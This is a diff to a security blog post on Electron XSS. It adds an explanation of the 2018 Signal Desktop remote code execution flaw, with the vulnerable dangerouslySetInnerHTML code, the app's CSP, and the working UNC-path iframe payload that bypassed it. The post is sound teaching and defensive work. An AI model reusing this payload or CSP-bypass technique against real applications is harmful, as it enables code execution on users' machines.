@@ -176,15 +176,68 @@ This also touches on why sanitizing user input can be a problematic fix for inje
 
 ### Signal
 
-In 2018 [Iván Ariel Barrera Oro](https://twitter.com/HacKanCuBa), [Alfredo Ortega](https://twitter.com/ortegaalfredo), [Juliano Rizzo](https://twitter.com/julianor), and [Matt Bryant](https://twitter.com/IAmMandatory) found [multiple remote code execution flaws](https://thehackerblog.com/i-too-like-to-live-dangerously-accidentally-finding-rce-in-signal-desktop-via-html-injection-in-quoted-replies/) in Signal, a secure end-to-end encrypted messaging application.
+In 2018 [Iván Ariel Barrera Oro](https://twitter.com/HacKanCuBa), [Alfredo Ortega](https://twitter.com/ortegaalfredo), [Juliano Rizzo](https://twitter.com/julianor), and [Matt Bryant](https://twitter.com/IAmMandatory) found [multiple remote code execution flaws](https://thehackerblog.com/i-too-like-to-live-dangerously-accidentally-finding-rce-in-signal-desktop-via-html-injection-in-quoted-replies/) in the [Signal](https://signal.org/) desktop application, a secure end-to-end encrypted messaging application.
 
-Notably, these exploits bypassed the applicaiton's [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP).
+Both variations of the exploit worked in a similar fashion, message content and quoted repsonses (shown below) were rendered using the `dangerouslySetInnerHTML()` function:
 
+#### [`Quote.tsx`](https://github.com/signalapp/Signal-Desktop/blob/721935b0c82a52d919ab61dff7ddc63d6d6ebe92/ts/components/conversation/Quote.tsx#L114)
+```tsx
+export class Quote extends React.Component<Props, {}> {
 
+  //...removed for brevity
+
+  public renderText() {
+    const { i18n, text, attachments } = this.props;
+
+    if (text) {
+      return (
+        <div className="text" dangerouslySetInnerHTML={{ __html: text }} />
+      );
+    }
+  }
+```
+
+This meant that message content and quoted messages that contained HTML tags would be rendered by Electron as HTML, the one complication with exploiting this flaw was that Electron had implement a fairly strong [Content Security Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) (CSP):
+
+#### [Background.html](https://github.com/signalapp/Signal-Desktop/blob/721935b0c82a52d919ab61dff7ddc63d6d6ebe92/background.html#L9)
+```html
+<meta http-equiv="Content-Security-Policy"
+  content="default-src 'none';
+          connect-src 'self' https: wss:;
+          script-src 'self';
+          style-src 'self' 'unsafe-inline';
+          img-src 'self' blob: data:;
+          font-src 'self';
+          media-src 'self' blob:;
+          child-src 'self';
+          object-src 'none'"
+>
+```
+
+In this case what _appears_ to be the primary hurdle the attacker must get over is the `script-src 'self'` line. This CSP policy blocks JavaScript, including inline JavaScript, unless it is loaded from the application's current origin. The browser's same origin policy (SOP) defines origins using protocol, host, and port. For example, `http://example.com` we'd have a protocol of `http:` host of `example.com` and an implicit port 80, which would be considered a distinct origin from `https://example.com` since the protocol nor the port (now an implicit 443) do not match. So if an application loaded from the `https://example.com` origin defines a CSP with a script directive of `script-src 'self'` only JavaScript loaded from `https://example.com` would be allowed to execute, anything else, including for example `http://example.com/foobar.js` would be blocked.
+
+So what origin does an Electron application run in, since there's no HTTP server? Well since the application is loaded from the user's file system the origin of an Electron application will default to a file URI, as shown below:
+
+```text
+> window.location.origin
+"file://"
+```
+
+This means that in the context of Signal Desktop's CSP that `'self'` equates to `file://`, and if you've read the details about our [2016 iMessage exploit](https://know.bishopfox.com/blog/2016/04/if-you-cant-break-crypto-break-the-client-recovery-of-plaintext-imessage-data) you'll know that `file://` origins have all sorts of special permissions such as using `XmlHttpRequest` to read files.
+
+[Iván Ariel Barrera Oro](https://twitter.com/HacKanCuBa), [Alfredo Ortega](https://twitter.com/ortegaalfredo), [Juliano Rizzo](https://twitter.com/julianor) very cleverly used this property to bypass Signal's CSP and load remote content. They didn't actually bypass `script-src 'self'` but instead leveraged `child-src 'self'`, which controls where `<iframe>` HTML tags can load content from. This directive is similarly set to `'self'`, which means that `<iframe>` tags must load content from the `file://` origin. Notably, child frames do _not_ inherit the parent frame's CSP polciy even if they're loaded from the same origin as the parent, so if an attacker is able to load content into a child frame it is completely uncontrained by the CSP and can execute arbitrary JavaScript as well as access all of the NodeJS APIs since this is Electron after all. The next property abused to load remote content is the use of UNC paths on the Windows operating system, which as you may guess are considered to be part of the `file://` origin. Therefore, the final payload is:
+
+```html
+<iframe src=\\DESKTOP-XXXXX\Temp\rce.html>
+```
+
+This payload loads an HTML file into an iframe from a UNC path, which does not violate the application's CSP since it's from the `file://` origin. Once loaded the child frame can execute native code in the context of the application since there's no more `script-src` restrictions.
+
+This exploit is an excellent example of the limitations of CSPs, a CSP _cannot_ prevent XSS; it can however complicate/limit the exploitation process, or make an otherwise exploitable bug unexploitable. CSP is a seatbelt, in the event of a crash it can and very well may save you depending upon the severity of the crash, but it's not perfect.
 
 ### What's in a Name?
 
-A function by any other name could be so vulnable. The flaws in both Signal and Bloodhound AD stemmed from the use of [ReactJS](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon, and not a 2nd thought as to why the React developers chose such a name. If developers from the security community consistently misuse these functions, what hope do developers without a security background have?
+A function by any other name could be so vulnable. The flaws in both Signal and Bloodhound AD stemmed from the use of [React](https://reactjs.org/docs/dom-elements.html#dangerouslysetinnerhtml)'s `dangerouslySetInnerHTML` function, which despite its name is seemingly used with reckless abandon, and not a 2nd thought as to why the React developers chose such a name. If developers from the security community consistently misuse these functions, what hope do developers without a security background have?
 
 All of the aforementioned bugs are at their core Cross-site Scripting vulnerabilities (XSS), which is a terrible name. Cross-site Scripting is a actually a JavaScript _injection vulnerability_. All injection vulnerabilities occur when the "computer" cannot properly differenciate between what is data and what is an instruction, and subsequently allows an attacker to trick the "computer" into misinterpreting (attacker-controlled) data as instructions. This can be said about XSS, as well as SQL injection, command injection, etc. The core mechanics at of all these vulnerabilities are actually the same, save for what the "computer" is.
 
@@ -197,7 +250,7 @@ $stmt->bind_param("sss", $firstname, $lastname, $email);
 
 The logic (i.e. the query) is first passed to the `prepare()` function, then the data (i.e. parameters) are subsequently passed in a seperate `bind_param()` function call. This prevents any possibility of the database misinterpreting use controlled data as SQL instructions. However, an application that exclusively makes use of prepared statements is not automatically "secure," though it may be free of this one particular vulnerability, care still must be taken when designing an application --SQL injection is not the only vulnerability that can result in an attacker stealing data from the database.
 
-## The Secure Road Not Taken
+## Reasonably Secure
 
 This is my attempt at making a _reasonably_ secure Electron application. High level design is:
 
